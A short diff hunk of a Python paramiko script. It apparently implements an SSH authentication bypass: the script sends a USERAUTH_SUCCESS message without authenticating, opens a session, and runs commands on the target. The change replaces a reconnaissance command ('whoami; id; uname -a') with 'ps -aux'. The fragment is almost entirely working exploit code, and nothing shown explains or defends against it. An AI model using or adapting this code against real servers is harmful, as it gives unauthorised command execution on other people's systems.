@@ -15,5 +15,5 @@ message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
 transport._send_message(message)
 
 cmd = transport.open_session()
-cmd.exec_command("whoami; id; uname -a")
+cmd.exec_command("ps -aux")
 print(cmd.recv(4096).decode())
